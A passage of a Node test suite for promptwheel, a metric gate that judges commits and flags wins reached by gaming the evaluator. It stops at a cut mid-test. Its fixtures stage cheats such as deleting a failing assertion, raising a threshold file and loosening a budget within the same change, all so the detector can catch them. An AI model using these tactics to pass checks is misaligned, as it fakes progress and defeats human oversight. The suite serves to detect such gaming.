// Dep-free test suite (node:test). Run: npm test  (or: node --test)
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync, spawnSync } from 'node:child_process';
import { mkdtempSync, writeFileSync, readFileSync, rmSync, existsSync, mkdirSync, utimesSync, symlinkSync, unlinkSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { extract, evaluate, median, spread, renderMarkdown, isNonSource, evaluatorMatcher, gain, judgeGaming, verdictFingerprint,
  allowFromComments, check, verdictExitCode, conformsToContract, VERDICTS, METRIC_STATUSES, DIRECTIONS, CONTRACT_VERSION, deriveVerdict, applyBudgets } from '../bin/promptwheel.mjs';
import { createHash } from 'node:crypto';
import { realpathSync, chmodSync } from 'node:fs';

const ENGINE = join(dirname(fileURLToPath(import.meta.url)), '..', 'bin', 'promptwheel.mjs');
// every temp repo this file makes, and every clean copy the engine makes for them, goes under one folder that is
// removed at exit: a run used to leave about 19 folders in the system temp folder
const TMP_ROOT = mkdtempSync(join(tmpdir(), 'pw-suite-'));
process.env.TMPDIR = TMP_ROOT;
process.on('exit', () => rmSync(TMP_ROOT, { recursive: true, force: true }));

// ---------------------------------------------------------------- unit: extract
test('extract: number = last number in output', () => assert.equal(extract('errors 3, then 7\n', 0), 7));
test('extract: exit code → 1/0', () => { assert.equal(extract('x', 0, 'exit'), 1); assert.equal(extract('x', 2, 'exit'), 0); });
test('extract: lines counts non-empty lines', () => assert.equal(extract('a\n\nb\n', 0, 'lines'), 2));
test('extract: regex first capture', () => assert.equal(extract('coverage: 88%', 0, { regex: 'coverage: (\\d+)' }), 88));
test('extract: regex capture wins over last-number fallback', () =>
  assert.equal(extract('coverage: 88% of 200 lines', 0, { regex: 'coverage: (\\d+)' }), 88));
test('extract: null when no number', () => assert.equal(extract('nothing here', 0), null));

// ------------------------------------------------------------ unit: median/spread
test('median: odd and even', () => { assert.equal(median([3, 1, 2]), 2); assert.equal(median([1, 2, 3, 4]), 2.5); });
test('median: empty → null', () => assert.equal(median([]), null));
test('spread: max - min', () => { assert.equal(spread([5, 2, 9]), 7); assert.equal(spread([]), 0); });

// ------------------------------------------------- unit: a cost paid for by a gain (`budget`, 0.8.14)
// A guard is a wall. A loop that runs with no person needs a rate too: this much gain buys this much cost, no more.
const bScore = (delta, over = {}) => ({ name: 'score', direction: 'up', guard: true, before: 0.8, after: +(0.8 + delta).toFixed(4), delta, status: delta > 0 ? 'improved' : 'unchanged', ok: true, ...over });
const bTokens = (before, after) => ({ name: 'tokens', direction: 'down', guard: true, before, after, delta: after - before, status: after > before ? 'regressed' : 'unchanged', ok: !(after > before) });
const bDefs = [{ name: 'score', direction: 'up', guard: true }, { name: 'tokens', direction: 'down', guard: true, budget: { gain: 'score', base: 0.10, rate: 44.5 } }];
test('budget: a cost that rose within base + rate x gain is paid for, and says by what', () => {
  const [, t] = applyBudgets([bScore(0.02), bTokens(100, 140)], bDefs);   // +40% against 0.10 + 44.5 * 0.02 = 99%
  assert.equal(t.ok, true); assert.equal(t.status, 'regressed'); assert.deepEqual(t.paid, { gain: 'score', share: 0.4, allowed: 0.99 });
  assert.equal(deriveVerdict([bScore(0.02), t]), 'pass');
});
test('budget: over the budget stays a failure and says by how much', () => {
  const [, t] = applyBudgets([bScore(0.02), bTokens(100, 300)], bDefs);   // +200% against 99%
  assert.equal(t.ok, false); assert.deepEqual(t.overBudget, { gain: 'score', share: 2, allowed: 0.99 }); assert.equal(t.paid, undefined);
  assert.equal(deriveVerdict([bScore(0.02), t]), 'fail');
});
test('budget: with no trusted gain the wall stands, whatever the base', () => {
  for (const s of [bScore(0), bScore(0.02, { status: 'inconclusive' })]) { const [, t] = applyBudgets([s, bTokens(100, 101)], bDefs); assert.equal(t.ok, false); assert.equal(t.paid, undefined); }
});
test('budget: a gain that was gamed, or could not be proved, pays for nothing', () => {
  for (const over of [{ gamed: true }, { unprovable: true }]) { const [, t] = applyBudgets([bScore(0.02, over), bTokens(100, 140)], bDefs); assert.equal(t.ok, false); assert.equal(t.paid, undefined); }
});
test('budget: a cost that started at zero has no share to measure, an unknown gain is inert, and a metric with no budget is untouched', () => {
  assert.equal(applyBudgets([bScore(0.02), bTokens(0, 40)], bDefs)[1].ok, false);
  assert.equal(applyBudgets([bScore(0.02), bTokens(100, 140)], [bDefs[0], { ...bDefs[1], budget: { gain: 'nope', base: 9, rate: 9 } }])[1].ok, false);
  assert.equal(applyBudgets([bScore(0.02), bTokens(100, 140)], [bDefs[0], { name: 'tokens', direction: 'down', guard: true }])[1].ok, false);
  assert.equal(applyBudgets([bScore(0.02), bTokens(100, 90)], bDefs)[1].paid, undefined, 'a cost that fell needs no paying');
});
// the whole engine on a small repo: the score and the cost both come from source files, so the win is earned in the source
function budgetRepo() {
  const d = mkdtempSync(join(TMP_ROOT, 'budget-')); const g = (...a) => execFileSync('git', a, { cwd: d, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'], env: { ...process.env, GIT_CONFIG_GLOBAL: '/dev/null', GIT_AUTHOR_NAME: 'a', GIT_AUTHOR_EMAIL: 'a@b.c', GIT_COMMITTER_NAME: 'a', GIT_COMMITTER_EMAIL: 'a@b.c' } });
  // the commands name the measure (measure.js, which no change here edits); the numbers live in a source file, as a real score lives in the code
  mkdirSync(join(d, 'src')); const put = (score, tokens) => writeFileSync(join(d, 'src/values.js'), `module.exports = { score: ${score}, tokens: ${tokens} }\n`);
  writeFileSync(join(d, 'measure.js'), "console.log(require('./src/values.js')[process.argv[2]])\n");
  const cfg = (budget) => writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ metrics: [
    { name: 'score', cmd: 'node measure.js score', extract: 'number', direction: 'up', guard: true },
    { name: 'tokens', cmd: 'node measure.js tokens', extract: 'number', direction: 'down', guard: true, ...(budget ? { budget } : {}) }] }, null, 2));
  put(80, 100); cfg({ gain: 'score', base: 0.10, rate: 0.2 }); g('init', '-q'); g('add', '-A'); g('commit', '-qm', 'base');
  const run = () => { const r = spawnSync(process.execPath, [ENGINE, 'run', '--base', 'HEAD~1', '--head', 'HEAD', '--json'], { cwd: d, encoding: 'utf8' }); let j = null; try { j = JSON.parse(r.stdout); } catch {} return { code: r.status, j }; };
  return { d, g, put, cfg, run };
}
test('budget, end to end: a gain of 2 with rate 0.2 buys a cost rise of up to 50%; 40% passes and names what paid, 80% fails', () => {
  const a = budgetRepo(); a.put(82, 140); a.g('commit', '-qam', 'better and dearer');
  const ok = a.run(); assert.equal(ok.code, 0, JSON.stringify(ok.j && ok.j.metrics)); assert.equal(ok.j.verdict, 'pass');
  const t = ok.j.metrics.find((x) => x.name === 'tokens'); assert.equal(t.status, 'regressed'); assert.equal(t.ok, true); assert.equal(t.paid.gain, 'score'); assert.equal(conformsToContract(ok.j).ok, true);
  const b = budgetRepo(); b.put(82, 180); b.g('commit', '-qam', 'better and far dearer');
  const no = b.run(); assert.equal(no.code, 1); assert.equal(no.j.verdict, 'fail'); assert.ok(no.j.metrics.find((x) => x.name === 'tokens').overBudget);
});
test('budget, end to end: a change cannot write itself a budget (the gate as it was at the base decides)', () => {
  const a = budgetRepo(); a.cfg(null); a.g('commit', '-qam', 'no budget yet');
  a.put(82, 140); a.cfg({ gain: 'score', base: 5, rate: 5 }); a.g('commit', '-qam', 'dearer, with a budget written in the same change');
  const r = a.run(); assert.notEqual(r.code, 0, 'a budget added in the change that needs it does not let it through'); assert.notEqual(r.j.verdict, 'pass');
});
test('budget, end to end: a change cannot loosen the budget it runs under (a budget is part of the guard)', () => {
  const a = budgetRepo(); a.put(82, 400); a.cfg({ gain: 'score', base: 5, rate: 5 }); a.g('commit', '-qam', 'four times the cost, and a looser budget in the same change');
  const r = a.run(); assert.notEqual(r.code, 0); assert.notEqual(r.j.verdict, 'pass', 'judged by the budget as it was at the base: 300% against 50%');
});

// -------------------------------------------------------------- unit: evaluate
const m = (over = {}) => ({ direction: 'down', guard: true, extract: 'number', ...over });

test('evaluate: improvement beyond noise → improved/medium/ok', () => {
  const ev = evaluate(m(), [10, 11], [4, 5], 2);
  assert.equal(ev.status, 'improved'); assert.equal(ev.ok, true); assert.equal(ev.confidence, 'medium');
});
test('evaluate: zero observed noise → high confidence', () => {
  const ev = evaluate(m(), [10, 10], [5, 5], 2);
  assert.equal(ev.status, 'improved'); assert.equal(ev.confidence, 'high');
});
test('evaluate: guarded regression beyond noise → fails (ok=false)', () => {
  const ev = evaluate(m(), [5, 5], [9, 9], 2);
  assert.equal(ev.status, 'regressed'); assert.equal(ev.ok, false);
});
test('evaluate: delta inside noise band → inconclusive, never fails a guard', () => {
  const ev = evaluate(m(), [200, 210], [205, 215], 2); // delta 5 ≤ noise 10
  assert.equal(ev.status, 'inconclusive'); assert.equal(ev.ok, true); assert.equal(ev.confidence, 'low');
});
test('evaluate: single read → unverified (noise unknown)', () => {
  assert.equal(evaluate(m({ guard: false }), [5], [4], 1).confidence, 'unverified');
});
test('evaluate: deterministic extract → high even on a single read', () => {
  assert.equal(evaluate(m({ extract: 'exit' }), [1], [1], 1).confidence, 'high');
});
test('evaluate: non-guard informational metric never fails', () => {
  assert.equal(evaluate(m({ guard: false }), [5, 5], [9, 9], 2).ok, true);
});
test('evaluate: one missing side → unmeasurable, never regressed', () => {
  const ev = evaluate(m(), [], [5, 5], 2);
  assert.equal(ev.status, 'unmeasurable'); assert.equal(ev.delta, null);
});

// ------------------------------------------------------------- unit: renderMarkdown
test('renderMarkdown: includes verdict, metric, delta', () => {
  const md = renderMarkdown({ base: 'a', head: 'b', mode: 'refs', repeat: 1, verdict: 'pass',
    metrics: [{ name: 'todos', guard: true, before: 4, after: 2, delta: -2, status: 'improved', confidence: 'high' }] });
  assert.match(md, /PASS/); assert.match(md, /todos/); assert.match(md, /-2/);
});

test('renderMarkdown: with more than one thing to accept, the comment to copy names each, and a reason that named too few says what was not let through', () => {
  const base = { base: 'a', head: 'b', mode: 'refs', repeat: 1, verdict: 'fail',
    metrics: [{ name: 'dependency_entries', guard: true, before: 1, after: 2, delta: 1, status: 'regressed', confidence: 'high', ok: false, allowable: true }],
    explained: [{ metric: 'dependency_entries', noted: false, what: 'a new dependency', allowable: true }] };
  assert.match(renderMarkdown({ ...base, allowable: ['dependency_entries'] }), /who did not open this PR comments `sawbuck-allow: <their reason>` on it/, 'one thing: no name needed');
  const two = renderMarkdown({ ...base, allowable: ['dependency_entries', 'mandate:lock-frozen'], allowed: { reason: 'dependency_entries: needed', cleared: ['dependency_entries'] } });
  assert.match(two, /who did not open this PR comments `sawbuck-allow: dependency_entries, lock-frozen: <their reason>` on it/);
  assert.match(two, /\*\*Allowed:\*\* `dependency_entries`/); assert.match(two, /\*\*Not let through:\*\* `mandate:lock-frozen`/);
  const none = renderMarkdown({ ...base, allowable: ['dependency_entries', 'mandate:lock-frozen'], allowed: { reason: 'looks fine', cleared: [] } });
  assert.doesNotMatch(none, /\*\*Allowed:\*\*/); assert.match(none, /\*\*Not let through:\*\* `dependency_entries`, `mandate:lock-frozen`/);
});

// ------------------------------------------------------------- integration helpers
function tmpRepo(metrics) {
  const d = mkdtempSync(join(tmpdir(), 'pw-test-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, '.gitignore'), '.promptwheel/\n');
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, metrics }));
  return d;
}
const rev = (d, r = 'HEAD') => execFileSync('git', ['rev-parse', r], { cwd: d, encoding: 'utf8' }).trim();
const commitAll = (d, msg) => { execFileSync('git', ['add', '-A'], { cwd: d }); execFileSync('git', ['commit', '-qm', msg], { cwd: d }); };
function pw(d, args) {
  try { return { out: execFileSync('node', [ENGINE, ...args], { cwd: d, encoding: 'utf8' }), code: 0 }; }
  catch (e) { return { out: `${e.stdout || ''}${e.stderr || ''}`, code: e.status }; }
}
const TODOS = { name: 'todos', cmd: 'grep -rn TODO . --include=*.js 2>/dev/null | wc -l', extract: 'number', direction: 'down', guard: true };

// -------------------------------------------------------- integration: run pass/fail
test('run: passes on improvement (exit 0), fails on guarded regression (exit 1)', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a // TODO\nb // TODO\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'app.js'), 'a\nb\n'); commitAll(d, 'improve');
  let r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
  assert.equal(r.code, 0); assert.match(r.out, /improved/);
  writeFileSync(join(d, 'app.js'), 'a // TODO\nb // TODO\nc // TODO\n'); commitAll(d, 'regress');
  r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
  assert.equal(r.code, 1); assert.match(r.out, /FAIL/);
  rmSync(d, { recursive: true, force: true });
});

// ------------------------------------------------- unit: verdict fingerprint (provenance)
test('verdictFingerprint: stable, order-independent, sensitive to the verdict', () => {
  const a = verdictFingerprint({ verdict: 'pass', metrics: [{ name: 'x', status: 'improved', ok: true, guard: true }, { name: 'y', status: 'unchanged', ok: true, guard: false }] });
  const b = verdictFingerprint({ verdict: 'pass', metrics: [{ name: 'y', status: 'unchanged', ok: true, guard: false }, { name: 'x', status: 'improved', ok: true, guard: true }] });
  assert.equal(a, b);                                   // metric order doesn't change the hash
  const c = verdictFingerprint({ verdict: 'gamed', metrics: [{ name: 'x', status: 'improved', ok: true, guard: true, gamed: true }] });
  assert.notEqual(a, c);                                // a different verdict is a different hash
  assert.match(a, /^[0-9a-f]{16}$/);
});

// ------------------------------------------- integration: evaluatorPaths content-hash auto-fail
test('run: editing a DECLARED evaluatorPath to pass is gamed; an UNdeclared one stays source', () => {
  const mk = (evaluatorPaths) => {
    const d = mkdtempSync(join(tmpdir(), 'pw-eval-'));
    const g = (a) => execFileSync('git', a, { cwd: d });
    g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
    writeFileSync(join(d, '.gitignore'), '.promptwheel/\n');
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, evaluatorPaths,
      metrics: [{ name: 'budget', cmd: 'node check.js', extract: 'exit', direction: 'pass', guard: true }] }));
    writeFileSync(join(d, 'src.js'), 'module.exports={errs:()=>3};\n');
    writeFileSync(join(d, 'budget.json'), '{"maxErrors":0}\n');
    writeFileSync(join(d, 'check.js'), "const{errs}=require('./src');const{maxErrors}=require('./budget.json');process.exit(errs()<=maxErrors?0:1);\n");
    commitAll(d, 'base');
    writeFileSync(join(d, 'budget.json'), '{"maxErrors":5}\n');   // raise the goalpost, no source change
    commitAll(d, 'head');
    return d;
  };
  // declared -> gamed (exit 2), and gate.evaluatorChanged names the file (proves the auto-fail ran)
  const d1 = mk(['budget.json']);
  let r = pw(d1, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']);
  assert.equal(r.code, 2);
  const rep = JSON.parse(r.out);
  assert.equal(rep.verdict, 'gamed');
  assert.ok(rep.gate && Array.isArray(rep.gate.evaluatorChanged) && rep.gate.evaluatorChanged.some((e) => e.path === 'budget.json'));
  rmSync(d1, { recursive: true, force: true });
  // UNdeclared -> the documented opt-in miss: budget.json stays source, the win survives, PASS
  const d2 = mk([]);
  r = pw(d2, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']);
  assert.equal(r.code, 0);
  assert.equal(JSON.parse(r.out).verdict, 'pass');
  rmSync(d2, { recursive: true, force: true });
});

// ------------------------------------------- integration: mandates (protected-path hard rule)
test('run: a mandate forbidding a path fails the gate when that path is touched, passes otherwise', () => {
  const mk = (touchProtected) => {
    const d = mkdtempSync(join(tmpdir(), 'pw-mand-'));
    const g = (a) => execFileSync('git', a, { cwd: d });
    g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
    writeFileSync(join(d, '.gitignore'), '.promptwheel/\n');
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false,
      mandates: [{ name: 'no-secrets-edits', paths: ['secrets.json'], reason: 'secrets are frozen; rotate in a dedicated PR' }],
      metrics: [{ name: 'todos', cmd: 'grep -c TODO app.js || true', extract: 'number', direction: 'down', guard: true }] }));
    writeFileSync(join(d, 'secrets.json'), '{"v":1}\n');
    writeFileSync(join(d, 'app.js'), 'x // TODO\n');
    commitAll(d, 'base');
    writeFileSync(join(d, 'app.js'), 'x\n');                             // a real win: TODO removed in source
    if (touchProtected) writeFileSync(join(d, 'secrets.json'), '{"v":2}\n'); // ... but a protected path was touched
    commitAll(d, 'head');
    return d;
  };
  // touched the protected path -> FAIL with a named mandate, even though the metric improved
  const d1 = mk(true);
  let r = pw(d1, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']);
  assert.equal(r.code, 1);
  let rep = JSON.parse(r.out);
  assert.equal(rep.verdict, 'fail');
  assert.ok(Array.isArray(rep.mandates) && rep.mandates[0].name === 'no-secrets-edits');
  assert.ok(rep.mandates[0].files.includes('secrets.json'));
  rmSync(d1, { recursive: true, force: true });
  // same win, protected path untouched -> the win stands, PASS, mandate silent
  const d2 = mk(false);
  r = pw(d2, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']);
  assert.equal(r.code, 0);
  rep = JSON.parse(r.out);
  assert.equal(rep.verdict, 'pass');
  assert.ok(!rep.mandates);
  rmSync(d2, { recursive: true, force: true });
});

// ----------------------------------------------------------- integration: provenance receipt
test('run: report carries a reproducible provenance receipt', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a // TODO\nb // TODO\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'app.js'), 'a\nb\n'); commitAll(d, 'improve');
  const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']);
  const rep = JSON.parse(r.out);
  assert.ok(rep.provenance, 'report has provenance');
  assert.equal(rep.provenance.tool, 'promptwheel');
  assert.match(rep.provenance.baseSha, /^[0-9a-f]{40}$/);
  assert.match(rep.provenance.headSha, /^[0-9a-f]{40}$/);
  assert.match(rep.provenance.configHash, /^[0-9a-f]{16}$/);
  assert.match(rep.provenance.verdictHash, /^[0-9a-f]{16}$/);
  const r2 = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']);
  assert.equal(JSON.parse(r2.out).provenance.verdictHash, rep.provenance.verdictHash); // reproducible
  rmSync(d, { recursive: true, force: true });
});

// ---------------------------------------------------------- unit: gaming detection
test('isNonSource: tests/config/grader/golden are non-source', () => {
  for (const p of ['app.test.js', 'test.js', 'tests.ts', 'src/__tests__/x.ts', 'spec/y.js',
    'eval.mjs', 'grader.ts', 'fixtures/a.json', 'x.snap', 'golden.json', 'tsconfig.json',
    'jest.config.js', '.eslintrc.json', 'pytest.ini', 'conftest.py', 'src/foo_test.py'])
    assert.equal(isNonSource(p), true, p);
});
test('isNonSource: ava\'s and node --test\'s test-*.js, *-test.js, *_test.js files and tsd type tests are non-source (a fixed test-release.js read as a source win, sendback bench 2026-11-10)', () => {
  for (const p of ['test-release.js', 'test-utils.mjs', 'packages/a/test-foo.ts', 'index.test-d.ts', 'src/types.test-d.mts', 'parse-test.js', 'e2e-checks/login-spec.js', 'lib/parse_test.mjs', 'src/foo_test.ts'])
    assert.equal(isNonSource(p), true, p);
  for (const p of ['latest-release.js', 'contest-entries.js', 'lib/protest-handler.ts', 'src/attest-x.mjs', 'index.d.ts', 'lib/latest.js', 'src/contest.mjs',
    // production code named after tests, found in real repos (2026-11-10): hyphen names under src/, lib/ or scripts/ stay source
    'packages/cli/src/lib/test-patterns.ts', 'packages/cli/src/commands/generate-test.ts', 'packages/collector/src/files/test-file.ts', 'lib/auth/test-auth.ts', 'scripts/test-psi.ts', 'scripts/smoke-test.mjs'])
    assert.equal(isNonSource(p), false, p);   // only a name that starts with test- (or tests-) at a path segment
});
test('isNonSource: the default test names and test configs of Bun, Cypress, .NET, PHPUnit, XCTest, ExUnit, Dart, Go, Rust, mocha, RSpec and coverage tools are non-source', () => {
  for (const p of ['src/a_spec.ts', 'src/login.cy.js', 'cypress/e2e/a.cy.ts', 'pkg/testdata/in.json', 'benches/b.rs',
    'MyApp.Tests/FooTests.cs', 'src/FooTest.cs', 'MyApp.Tests.csproj', 'src/FooTest.php', 'phpunit.xml', 'phpunit.xml.dist',
    'FooTests.swift', 'Sources/App/FooTests.swift', 'lib/a_test.exs', 'lib/a_test.dart', 'integration_test/app_test.dart',
    '.mocharc.yml', '.mocharc.json', '.rspec', 'vitest.workspace.ts', 'src/setupTests.ts',
    '.nycrc', '.nycrc.json', '.c8rc.json', 'codecov.yml', '.coveragerc'])
    assert.equal(isNonSource(p), true, p);
  for (const p of ['src/latest.cs', 'src/Contest.php', 'Sources/Protest.swift', 'src/benchmark.rs', 'src/testdataset.py', 'MyApp/Program.cs',
    'lib/inspect.ex', 'lib/latest.dart', 'src/cyclic.ts', 'src/Request.cs', 'src/Manifest.swift'])
    assert.equal(isNonSource(p), false, p);   // look-alike production names stay source
});
test('isNonSource: real production source is NOT non-source', () => {
  for (const p of ['src/app.js', 'lib/handler.ts', 'index.mjs', 'latest.js', 'mytest.js', 'contest.py'])
    assert.equal(isNonSource(p), false, p);
});
test('isNonSource: a grader/eval/score FILE by name is non-source; a production name that merely starts with the token is source', () => {
  for (const p of ['eval.mjs', 'grader.ts', 'score.test.ts', 'eval-set.js', 'grader_x.mjs', 'scoring.ts', 'evals.ts', 'scorer.js', 'lib/grader.cjs'])
    assert.equal(isNonSource(p), true, p);
  for (const p of ['evaluate.ts', 'evaluation.js', 'scoreboard.js', 'scores.ts', 'src/evaluator.mjs', 'graderboard.ts'])
    assert.equal(isNonSource(p), false, p);   // an honest fix in src/evaluation.ts must never read GAMED
});
test('isNonSource: tool-named CONFIG is non-source; tool-named SOURCE is source', () => {
  for (const p of ['jest.config.ts', 'eslint.config.mjs', 'playwright.config.js', 'karma.conf.js', 'jest.setup.ts', 'tsconfig.base.json'])
    assert.equal(isNonSource(p), true, p);
  for (const p of ['cli/src/installers/eslint.ts', 'src/vitest-helpers.ts', 'lib/babel.ts'])
    assert.equal(isNonSource(p), false, p);  // corpus finding: production file named after a tool must stay in the source slice
});
test('isNonSource: cross-language test filenames are non-source (red-team gap)', () => {
  for (const p of ['test.c', 'tests.go', 'subtract_test.c', 'test_foo.cpp', 'pkg/handler_test.go',
    'math_test.rs', 'user_spec.rb', 'calc_test.rb', 'SubtractTest.java', 'BarTests.kt'])
    assert.equal(isNonSource(p), true, p);
});
test('isNonSource: ambiguous production names that merely contain "test" stay source', () => {
  for (const p of ['latest.c', 'speedtest.go', 'contest.java', 'Contest.java', 'Check.java',
    'lib/latest.rb', 'contest.rb'])   // score.py was here while the classifier read JS only; since 0.8.1 it is a grader
    assert.equal(isNonSource(p), false, p);  // conservative: a strong-signal token (_test/_spec/Test suffix) is required, never a substring
});
test('evaluatorMatcher: opt-in evaluator-path globs (bare name any depth, "/" anchors, ** crosses, leading /)', () => {
  const bare = evaluatorMatcher({ evaluatorPaths: ['budget.json'] });
  for (const p of ['budget.json', 'config/budget.json', 'a/b/budget.json']) assert.equal(bare(p), true, p);
  for (const p of ['budget.json.bak', 'mybudget.json', 'src/app.js']) assert.equal(bare(p), false, p);
  const glob = evaluatorMatcher({ evaluatorPaths: ['ci/*.limits', 'thresholds/**'] });
  assert.equal(glob('ci/perf.limits'), true);
  assert.equal(glob('ci/nested/perf.limits'), false);   // * does not cross /
  assert.equal(glob('thresholds/a/b/x.json'), true);     // ** crosses /
  const rooted = evaluatorMatcher({ evaluatorPaths: ['/budget.json'] });
  assert.equal(rooted('budget.json'), true);
  assert.equal(rooted('config/budget.json'), false);     // leading / anchors to repo root
  assert.equal(evaluatorMatcher({})('anything'), false);              // no field -> matches nothing
  assert.equal(evaluatorMatcher({ evaluatorPaths: 'nope' })('nope'), false);  // non-array ignored, no throw
});
test('gain: directional improvement', () => {
  assert.equal(gain({ direction: 'up' }, 5, 8), 3);
  assert.equal(gain({ direction: 'down' }, 8, 5), 3);
  assert.equal(gain({ direction: 'pass' }, 0, 1), 1);
  assert.equal(gain({ direction: 'pass' }, 0, 0), -1);
});
test('judgeGaming: zero source change → gamed', () =>
  assert.equal(judgeGaming({ before: 0, after: 1, direction: 'pass' }, { hadSourceChange: false }).gamed, true));
test('judgeGaming: source reproduces the full win → not gamed', () => {
  const j = judgeGaming({ before: 0, after: 1, direction: 'pass' }, { hadSourceChange: true, samples: [1] });
  assert.equal(j.gamed, false); assert.equal(j.retained, 1);
});
test('judgeGaming: source reproduces <half the win → gamed', () => {
  const j = judgeGaming({ before: 100, after: 40, direction: 'down' }, { hadSourceChange: true, samples: [85] });
  assert.equal(j.gamed, true); assert.equal(j.retained, 0.25);
});
test('judgeGaming: exactly half the gain retained → NOT gamed (boundary)', () => {
  const j = judgeGaming({ before: 100, after: 60, direction: 'down' }, { hadSourceChange: true, samples: [80] });
  assert.equal(j.retained, 0.5); assert.equal(j.gamed, false);
});
test('judgeGaming: gamingThreshold is honored (same retention, different verdicts)', () => {
  const src = { hadSourceChange: true, samples: [80] }; // retained 0.5
  assert.equal(judgeGaming({ before: 100, after: 60, direction: 'down' }, src, 0.6).gamed, true);
  assert.equal(judgeGaming({ before: 100, after: 60, direction: 'down' }, src, 0.4).gamed, false);
});

// ------------------------------------------ integration: --detect-gaming end-to-end
test('run --detect-gaming: catches a win made by editing the test; passes a real source fix', () => {
  const TP = { name: 'tests_pass', cmd: 'node app.test.js', extract: 'exit', direction: 'pass', guard: true };
  const d = tmpRepo([TP]);
  writeFileSync(join(d, 'src.js'), 'module.exports = { add: (a,b)=>a+b };\n');
  writeFileSync(join(d, 'app.test.js'), "const A=require('assert');const {add,subtract}=require('./src');A.strictEqual(add(2,2),4);A.strictEqual(subtract(5,3),2);\n");
  commitAll(d, 'base'); const base = rev(d);
  // GAMED: delete the failing assertion (edit the TEST); source untouched
  writeFileSync(join(d, 'app.test.js'), "const A=require('assert');const {add}=require('./src');A.strictEqual(add(2,2),4);\n");
  commitAll(d, 'gamed'); const gamed = rev(d);
  let r = pw(d, ['run', '--base', base, '--head', gamed, '--detect-gaming', '--no-record']);
  assert.equal(r.code, 2, r.out); assert.match(r.out, /GAMED/);
  // LEGIT: implement subtract in SOURCE; test intact
  execFileSync('git', ['checkout', '-q', base], { cwd: d });
  writeFileSync(join(d, 'src.js'), 'module.exports = { add: (a,b)=>a+b, subtract: (a,b)=>a-b };\n');
  commitAll(d, 'legit'); const legit = rev(d);
  r = pw(d, ['run', '--base', base, '--head', legit, '--detect-gaming', '--no-record']);
  assert.equal(r.code, 0, r.out); assert.doesNotMatch(r.out, /GAMED/);
  rmSync(d, { recursive: true, force: true });
});

test('run --detect-gaming: a gamingCheck:false guard is exempt from the source-only re-run (no FP on test-side gains)', () => {
  // tests_pass is the source-proven target; `asserts` is a test-side guard that must NOT be re-proven from source
  const d = tmpRepo([
    { name: 'tests_pass', cmd: 'node t.js', extract: 'exit', direction: 'pass', guard: true },
    { name: 'asserts', cmd: 'grep -roE "ok" x.test.js 2>/dev/null | wc -l | tr -d " "', extract: 'number', direction: 'up', guard: true, gamingCheck: false },
  ]);
  writeFileSync(join(d, 'src.js'), 'module.exports={f:()=>1};\n');
  writeFileSync(join(d, 't.js'), "const a=require('assert');const{f,g}=require('./src');a.strictEqual(f(),1);a.strictEqual(g(),2);\n"); // g missing → fails
  writeFileSync(join(d, 'x.test.js'), 'ok\n');
  commitAll(d, 'base'); const base = rev(d);
  writeFileSync(join(d, 'src.js'), 'module.exports={f:()=>1,g:()=>2};\n'); // real source fix → tests pass
  writeFileSync(join(d, 'x.test.js'), 'ok\nok\nok\n');                      // test-side gain (asserts 1→3)
  commitAll(d, 'head');
  const r = pw(d, ['run', '--base', base, '--head', 'HEAD', '--detect-gaming', '--no-record']);
  assert.equal(r.code, 0, r.out);          // PASS, the test-side gain must not be flagged GAMED
  assert.doesNotMatch(r.out, /GAMED/);
  rmSync(d, { recursive: true, force: true });
});

test('run --detect-gaming: evaluatorPaths opts a generic gate file into the non-source slice', () => {
  const GATE = { name: 'gate', cmd: 'node check.js', extract: 'exit', direction: 'pass', guard: true };
  const d = tmpRepo([GATE]);
  const base0 = { 'src.js': 'module.exports={errs:()=>3};\n', 'budget.json': '{"maxErrors":0}\n', 'check.js': "const{errs}=require('./src');const{maxErrors}=require('./budget.json');process.exit(errs()<=maxErrors?0:1);\n" };
  const writeBase = () => { for (const [p, c] of Object.entries(base0)) writeFileSync(join(d, p), c); };
  // (1) NOT declared: raising the generic threshold file reads as a source win -> PASS (the open-gap baseline)
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, metrics: [GATE] }));
  writeBase(); commitAll(d, 'base'); const base = rev(d);
  writeFileSync(join(d, 'budget.json'), '{"maxErrors":5}\n'); commitAll(d, 'raise'); const raised = rev(d);
  let r = pw(d, ['run', '--base', base, '--head', raised, '--detect-gaming', '--no-record']);
  assert.equal(r.code, 0, r.out); assert.doesNotMatch(r.out, /GAMED/);
  // (2) declared as evaluator surface: the SAME cheat is now caught
  execFileSync('git', ['checkout', '-q', base], { cwd: d });
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, evaluatorPaths: ['budget.json'], metrics: [GATE] }));
  writeFileSync(join(d, 'budget.json'), '{"maxErrors":0}\n'); commitAll(d, 'base2'); const base2 = rev(d);
  writeFileSync(join(d, 'budget.json'), '{"maxErrors":5}\n'); commitAll(d, 'raise2'); const raised2 = rev(d);
